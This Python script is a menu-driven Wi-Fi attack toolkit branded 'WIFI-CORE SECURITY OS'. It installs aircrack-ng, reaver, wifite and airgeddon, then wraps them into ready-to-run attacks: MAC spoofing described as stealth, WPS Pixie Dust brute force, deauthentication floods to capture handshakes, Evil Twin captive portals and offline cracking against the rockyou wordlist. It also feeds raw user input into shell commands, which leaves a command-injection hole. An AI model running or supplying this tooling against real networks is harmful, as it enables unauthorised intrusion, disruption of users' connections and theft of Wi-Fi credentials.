# coding: utf-8
import os
import sys
import time
import subprocess

# --- STYLING (Classic Terminal) ---
G = "\033[32m"  # Green
R = "\033[31m"  # Red
Y = "\033[33m"  # Yellow
B = "\033[34m"  # Blue
W = "\033[0m"   # White/Reset

def header():
    os.system("clear")
    print(f"""{G}
    ██╗    ██╗██╗███████╗██╗     ██████╗ ██████╗ ███████╗
    ██║    ██║██║██╔════╝██║    ██╔════╝██╔═══██╗██╔════╝
    ██║ █╗ ██║██║█████╗  ██║    ██║     ██║   ██║█████╗  
    ██║███╗██║██║██╔══╝  ██║    ██║     ██║   ██║██╔══╝  
    ╚███╔███╔╝██║██║     ██║    ╚██████╗╚██████╔╝███████╗
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═════╝ ╚══════╝
    {B}>> WIFI-CORE SECURITY OS [Version 2.3-STABLE]{W}""")

def progress_bar(current, total, pkg_name):
    width = 30
    progress = int(width * current / total)
    bar = "█" * progress + "-" * (width - progress)
    sys.stdout.write(f"\r{Y}[INSTALLING]{W} |{bar}| {current}/{total} {pkg_name} ".ljust(60))
    sys.stdout.flush()

def install_system():
    header()
    print(f"\n{B}[*] INITIALIZING REPOSITORY CHECK...{W}\n")
    packages = {
        "aircrack-ng": ["1", "2", "4", "6"],
        "xterm": ["4", "5"],
        "reaver": ["3"],
        "pixiewps": ["3"],
        "bully": ["3"],
        "wifite": ["2"],
        "airgeddon": ["5"],
        "hostapd": ["5"],
        "dnsmasq": ["5"],
        "crunch": ["6"],
        "macchanger": ["1"]
    }
    failed_tools = []
    total = len(packages)
    for i, (pkg, options) in enumerate(packages.items(), 1):
        progress_bar(i, total, pkg)
        result = subprocess.run(["sudo", "apt-get", "install", "-y", pkg], capture_output=True, text=True)
        if result.returncode != 0:
            failed_tools.append((pkg, options))
    print("\n")
    if failed_tools:
        print(f"{R}[!] INSTALLATION COMPLETED WITH ERRORS{W}")
        for pkg, opts in failed_tools:
            print(f"{pkg:<15} | {', '.join(opts):<20}")
    else:
        print(f"{G}[+] ALL PACKAGES INSTALLED SUCCESSFULLY.{W}")
        if os.path.exists("/usr/share/wordlists/rockyou.txt.gz"):
            os.system("sudo gzip -d /usr/share/wordlists/rockyou.txt.gz")
    input(f"\n{G}Press Enter to return to OS...{W}")

def monitor_mode_menu():
    header()
    print(f"\n{B}--- INTERFACE CONTROL CENTER ---{W}")
    print(f"(1) Enable Monitor Mode (airmon-ng start)")
    print(f"(2) Disable Monitor Mode (Return to Normal/Internet)")
    print(f"(3) Spoof MAC Address (Stealth Mode)")
    print(f"(4) Back to Main Menu")
    print("-" * 40)
    
    choice = input(f"{G}mode-select{W}:~$ ")
    
    if choice == "1":
        iface = input("Enter Interface (e.g., wlan0): ")
        os.system(f"sudo airmon-ng start {iface} && sudo airmon-ng check kill")
        print(f"{G}[+] Monitor Mode active. Your interface is likely {iface}mon{W}")
        time.sleep(2)
    elif choice == "2":
        iface = input("Enter Monitor Interface (e.g., wlan0mon): ")
        os.system(f"sudo airmon-ng stop {iface}")
        os.system("sudo service network-manager restart")
        print(f"{G}[+] Network Manager restarted. Internet should return shortly.{W}")
        time.sleep(2)
    elif choice == "3":
        iface = input("Enter Interface: ")
        os.system(f"sudo ip link set {iface} down")
        os.system(f"sudo macchanger -r {iface}")
        os.system(f"sudo ip link set {iface} up")
        print(f"{G}[+] MAC Address randomized.{W}")
        time.sleep(2)
    return

def main_menu():
    header()
    print(f"""
 {G}(1){W} Interface Control (On/Off)  {G}(5){W} EVIL TWIN (Captive Portal)
 {G}(2){W} Scan Networks (Airodump)    {G}(6){W} Crack Handshake (Offline)
 {G}(3){W} WPS Attack (Pixie Dust)     {G}(7){W} Tool Docs & Workflow
 {G}(4){W} Capture Handshake (Deauth)  {G}(8){W} Repair/Install System
 
 {R}(00){W} Shutdown System
-------------------------------------------------------""")
    
    cmd = input(f"{G}wifi-os{W}@{B}root{W}:~$ ").strip()

    if cmd == "1":
        monitor_mode_menu()
        main_menu()
    elif cmd == "2":
        iface = input("Enter Monitor Interface: ")
        os.system(f"sudo airodump-ng {iface}")
        main_menu()
    elif cmd == "3":
        iface = input("Enter Monitor Interface: ")
        bssid = input("Target BSSID: ")
        os.system(f"sudo reaver -i {iface} -b {bssid} -K")
        main_menu()
    elif cmd == "4":
        iface = input("Monitor Interface: ")
        bssid = input("Target BSSID: ")
        chan = input("Channel: ")
        name = input("Output Filename: ")
        os.system(f"xterm -geometry 80x20+0+0 -hold -T 'CAPTURE' -e 'airodump-ng -c {chan} --bssid {bssid} -w {name} {iface}' &")
        os.system(f"xterm -geometry 80x10+0+500 -hold -T 'DEAUTH' -e 'aireplay-ng -0 20 -a {bssid} {iface}' &")
        main_menu()
    elif cmd == "5":
        os.system("sudo airgeddon")
        main_menu()
    elif cmd == "6":
        cap = input("Path to .cap file: ")
        word = input("Path to wordlist (Default /usr/share/wordlists/rockyou.txt): ")
        if not word: word = "/usr/share/wordlists/rockyou.txt"
        os.system(f"aircrack-ng {cap} -w {word}")
        input("Press Enter to continue...")
        main_menu()
    elif cmd == "7":
        header()
        print(f"{B}--- SYSTEM WORKFLOW ---{W}\n")
        print(f"1. Use {G}Option 1{W} to start Monitor Mode.")
        print(f"2. Use {G}Option 4{W} to Deauth and grab Handshake.")
        print(f"3. Use {G}Option 5{W} to start Evil Twin (requires Handshake).")
        print(f"4. Once finished, use {G}Option 1 -> (2){W} to get your internet back.")
        input(f"\nPress Enter...")
        main_menu()
    elif cmd == "8":
        install_system()
        main_menu()
    elif cmd == "00":
        sys.exit()
    else:
        main_menu()

if __name__ == "__main__":
    if os.getuid() != 0:
        print(f"{R}[!] ERROR: Run as sudo.{W}")
        sys.exit()
    main_menu()
